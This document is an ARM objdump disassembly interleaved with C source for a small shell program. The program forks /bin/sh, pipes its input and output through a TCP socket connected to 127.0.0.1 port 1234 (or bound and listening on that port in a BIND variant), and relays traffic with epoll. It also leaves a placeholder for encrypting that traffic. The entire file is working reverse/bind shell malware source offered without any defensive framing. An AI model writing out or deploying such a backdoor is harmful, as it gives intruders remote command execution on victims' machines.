
epl.o:     file format elf32-littlearm


Disassembly of section .text.startup:

00000000 <main>:
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
   0:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   4:	e24dda02 	sub	sp, sp, #8192	; 0x2000
   8:	e24dd038 	sub	sp, sp, #56	; 0x38
    int                s2;
    #endif
    int                pid, fd, in[2], out[2];
    char               buf[BUFSIZ];
    struct epoll_event evts;
    char               *args[]={"/bin/sh", NULL};
   c:	e59f31f8 	ldr	r3, [pc, #504]	; 20c <main+0x20c>
  10:	e3a05000 	mov	r5, #0
  
    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
  14:	e1a0000d 	mov	r0, sp
    int                s2;
    #endif
    int                pid, fd, in[2], out[2];
    char               buf[BUFSIZ];
    struct epoll_event evts;
    char               *args[]={"/bin/sh", NULL};
  18:	e58d3010 	str	r3, [sp, #16]
  1c:	e58d5014 	str	r5, [sp, #20]
  
    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
  20:	ebfffffe 	bl	0 <pipe>
    pipe(out);
  24:	e28d0008 	add	r0, sp, #8
  28:	ebfffffe 	bl	0 <pipe>

    // fork process
    pid = fork();
  2c:	ebfffffe 	bl	0 <fork>
    
    // if child process
    if (pid==0){
  30:	e2508000 	subs	r8, r0, #0
      // assign read end to stdin
      dup2(in[0], STDIN_FILENO);
  34:	e59d0000 	ldr	r0, [sp]

    // fork process
    pid = fork();
    
    // if child process
    if (pid==0){
  38:	1a000014 	bne	90 <main+0x90>
      // assign read end to stdin
      dup2(in[0], STDIN_FILENO);
  3c:	e1a01008 	mov	r1, r8
  40:	ebfffffe 	bl	0 <dup2>
      // assign write end to stdout   
      dup2(out[1], STDOUT_FILENO);
  44:	e59d000c 	ldr	r0, [sp, #12]
  48:	e3a01001 	mov	r1, #1
  4c:	ebfffffe 	bl	0 <dup2>
      // assign write end to stderr  
      dup2(out[1], STDERR_FILENO);  
  50:	e3a01002 	mov	r1, #2
  54:	e59d000c 	ldr	r0, [sp, #12]
  58:	ebfffffe 	bl	0 <dup2>
      
      // close pipes
      close(in[0]); close(in[1]);
  5c:	e59d0000 	ldr	r0, [sp]
  60:	ebfffffe 	bl	0 <close>
  64:	e59d0004 	ldr	r0, [sp, #4]
  68:	ebfffffe 	bl	0 <close>
      close(out[0]); close(out[1]);
  6c:	e59d0008 	ldr	r0, [sp, #8]
  70:	ebfffffe 	bl	0 <close>
  74:	e59d000c 	ldr	r0, [sp, #12]
  78:	ebfffffe 	bl	0 <close>
      
      // execute shell
      execve(args[0], args, 0);
  7c:	e59d0010 	ldr	r0, [sp, #16]
  80:	e28d1010 	add	r1, sp, #16
  84:	e1a02008 	mov	r2, r8
  88:	ebfffffe 	bl	0 <execve>
  8c:	ea000056 	b	1ec <main+0x1ec>
    } else {      
      // close read and write ends
      close(in[0]); close(out[1]);
  90:	ebfffffe 	bl	0 <close>
  94:	e59d000c 	ldr	r0, [sp, #12]
  98:	ebfffffe 	bl	0 <close>
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  9c:	e3a01001 	mov	r1, #1
  a0:	e1a02005 	mov	r2, r5
  a4:	e3a00002 	mov	r0, #2
  a8:	ebfffffe 	bl	0 <socket>
      
      sa.sin_family = AF_INET;
  ac:	e3a03002 	mov	r3, #2
  b0:	e1cd32b8 	strh	r3, [sp, #40]	; 0x28
    } else {      
      // close read and write ends
      close(in[0]); close(out[1]);
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  b4:	e1a04000 	mov	r4, r0
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(atoi("1234"));
  b8:	e59f0150 	ldr	r0, [pc, #336]	; 210 <main+0x210>
  bc:	ebfffffe 	bl	0 <atoi>
  c0:	e6ff3070 	uxth	r3, r0
  c4:	e1a03423 	lsr	r3, r3, #8
  c8:	e1833400 	orr	r3, r3, r0, lsl #8
        listen(s, 0);
        r=accept(s, 0, 0);
        s2=s; s=r;
      #else
        // connect to remote host
        sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  cc:	e59f0140 	ldr	r0, [pc, #320]	; 214 <main+0x214>
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(atoi("1234"));
  d0:	e1cd32ba 	strh	r3, [sp, #42]	; 0x2a
        listen(s, 0);
        r=accept(s, 0, 0);
        s2=s; s=r;
      #else
        // connect to remote host
        sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  d4:	ebfffffe 	bl	0 <inet_addr>
      
        r=connect(s, (struct sockaddr*)&sa, sizeof(sa));
  d8:	e28d1028 	add	r1, sp, #40	; 0x28
  dc:	e3a02010 	mov	r2, #16
        listen(s, 0);
        r=accept(s, 0, 0);
        s2=s; s=r;
      #else
        // connect to remote host
        sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  e0:	e58d002c 	str	r0, [sp, #44]	; 0x2c
      
        r=connect(s, (struct sockaddr*)&sa, sizeof(sa));
  e4:	e1a00004 	mov	r0, r4
  e8:	ebfffffe 	bl	0 <connect>
      #endif
      
      // if ok
      if(r>=0){
  ec:	e3500000 	cmp	r0, #0
  f0:	ba000035 	blt	1cc <main+0x1cc>
        // open an epoll file descriptor
        efd = epoll_create1(0);
  f4:	e1a00005 	mov	r0, r5
  f8:	ebfffffe 	bl	0 <epoll_create1>
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          evts.data.fd = fd;
          evts.events  = EPOLLIN;
  fc:	e28d6038 	add	r6, sp, #56	; 0x38
 100:	e3a07001 	mov	r7, #1
 104:	e5267020 	str	r7, [r6, #-32]!	; 0xffffffe0
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
 108:	e1a01007 	mov	r1, r7
 10c:	e1a02004 	mov	r2, r4
 110:	e1a03006 	mov	r3, r6
        efd = epoll_create1(0);
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          evts.data.fd = fd;
 114:	e58d4020 	str	r4, [sp, #32]
      #endif
      
      // if ok
      if(r>=0){
        // open an epoll file descriptor
        efd = epoll_create1(0);
 118:	e1a05000 	mov	r5, r0
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          evts.data.fd = fd;
          evts.events  = EPOLLIN;
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
 11c:	ebfffffe 	bl	0 <epoll_ctl>
        // open an epoll file descriptor
        efd = epoll_create1(0);
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
 120:	e59d2008 	ldr	r2, [sp, #8]
          evts.data.fd = fd;
          evts.events  = EPOLLIN;
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
 124:	e1a00005 	mov	r0, r5
 128:	e1a01007 	mov	r1, r7
 12c:	e1a03006 	mov	r3, r6
        efd = epoll_create1(0);
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          evts.data.fd = fd;
 130:	e58d2020 	str	r2, [sp, #32]
          evts.events  = EPOLLIN;
 134:	e58d7018 	str	r7, [sp, #24]
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
 138:	ebfffffe 	bl	0 <epoll_ctl>
        }
          
        // now loop until user exits or some other error
        for (;;){
          r = epoll_wait(efd, &evts, 1, -1);
 13c:	e1a00005 	mov	r0, r5
 140:	e1a01006 	mov	r1, r6
 144:	e3a02001 	mov	r2, #1
 148:	e3e03000 	mvn	r3, #0
 14c:	ebfffffe 	bl	0 <epoll_wait>
                  
          // error? bail out           
          if (r<=0) break;
 150:	e3500000 	cmp	r0, #0
 154:	da000010 	ble	19c <main+0x19c>
         
          // not input? bail out
          if (!(evts.events & EPOLLIN)) break;
 158:	e59d3018 	ldr	r3, [sp, #24]
 15c:	e3130001 	tst	r3, #1
 160:	0a00000d 	beq	19c <main+0x19c>

          fd = evts.data.fd;
          
          // assign socket or read end of output
          r=(fd==s)?s:out[0];
 164:	e59d3020 	ldr	r3, [sp, #32]
          // assign socket or write end of input
          w=(fd==s)?in[1]:s;

          // read from socket or stdout        
          len=read(r, buf, BUFSIZ);
 168:	e28d1038 	add	r1, sp, #56	; 0x38
          if (!(evts.events & EPOLLIN)) break;

          fd = evts.data.fd;
          
          // assign socket or read end of output
          r=(fd==s)?s:out[0];
 16c:	e1530004 	cmp	r3, r4
 170:	01a00004 	moveq	r0, r4
 174:	159d0008 	ldrne	r0, [sp, #8]
          // assign socket or write end of input
          w=(fd==s)?in[1]:s;

          // read from socket or stdout        
          len=read(r, buf, BUFSIZ);
 178:	e3a02a02 	mov	r2, #8192	; 0x2000
          fd = evts.data.fd;
          
          // assign socket or read end of output
          r=(fd==s)?s:out[0];
          // assign socket or write end of input
          w=(fd==s)?in[1]:s;
 17c:	059d7004 	ldreq	r7, [sp, #4]
          if (!(evts.events & EPOLLIN)) break;

          fd = evts.data.fd;
          
          // assign socket or read end of output
          r=(fd==s)?s:out[0];
 180:	11a07004 	movne	r7, r4
          // assign socket or write end of input
          w=(fd==s)?in[1]:s;

          // read from socket or stdout        
          len=read(r, buf, BUFSIZ);
 184:	ebfffffe 	bl	0 <read>
          
          // encrypt/decrypt data here
          
          // write to socket or stdin        
          write(w, buf, len);        
 188:	e28d1038 	add	r1, sp, #56	; 0x38
          r=(fd==s)?s:out[0];
          // assign socket or write end of input
          w=(fd==s)?in[1]:s;

          // read from socket or stdout        
          len=read(r, buf, BUFSIZ);
 18c:	e1a02000 	mov	r2, r0
          
          // encrypt/decrypt data here
          
          // write to socket or stdin        
          write(w, buf, len);        
 190:	e1a00007 	mov	r0, r7
 194:	ebfffffe 	bl	0 <write>
        }      
 198:	eaffffe7 	b	13c <main+0x13c>
        // remove 2 descriptors 
        epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);                  
 19c:	e3a01002 	mov	r1, #2
 1a0:	e1a02004 	mov	r2, r4
 1a4:	e3a03000 	mov	r3, #0
 1a8:	e1a00005 	mov	r0, r5
 1ac:	ebfffffe 	bl	0 <epoll_ctl>
        epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);                  
 1b0:	e1a00005 	mov	r0, r5
 1b4:	e3a01002 	mov	r1, #2
 1b8:	e59d2008 	ldr	r2, [sp, #8]
 1bc:	e3a03000 	mov	r3, #0
 1c0:	ebfffffe 	bl	0 <epoll_ctl>
        close(efd);
 1c4:	e1a00005 	mov	r0, r5
 1c8:	ebfffffe 	bl	0 <close>
      }
      // shutdown socket
      shutdown(s, SHUT_RDWR);
 1cc:	e3a01002 	mov	r1, #2
 1d0:	e1a00004 	mov	r0, r4
 1d4:	ebfffffe 	bl	0 <shutdown>
      close(s);
 1d8:	e1a00004 	mov	r0, r4
 1dc:	ebfffffe 	bl	0 <close>
      #ifdef BIND
        close(s2);
      #endif
      // terminate shell      
      kill(pid, SIGCHLD);            
 1e0:	e1a00008 	mov	r0, r8
 1e4:	e3a01011 	mov	r1, #17
 1e8:	ebfffffe 	bl	0 <kill>
    }
    close(in[1]);
 1ec:	e59d0004 	ldr	r0, [sp, #4]
 1f0:	ebfffffe 	bl	0 <close>
    close(out[0]);
 1f4:	e59d0008 	ldr	r0, [sp, #8]
 1f8:	ebfffffe 	bl	0 <close>
    return 0; 
}
 1fc:	e3a00000 	mov	r0, #0
 200:	e28dda02 	add	sp, sp, #8192	; 0x2000
 204:	e28dd038 	add	sp, sp, #56	; 0x38
 208:	e8bd81f0 	pop	{r4, r5, r6, r7, r8, pc}
 20c:	00000000 	.word	0x00000000
 210:	00000008 	.word	0x00000008
 214:	0000000d 	.word	0x0000000d
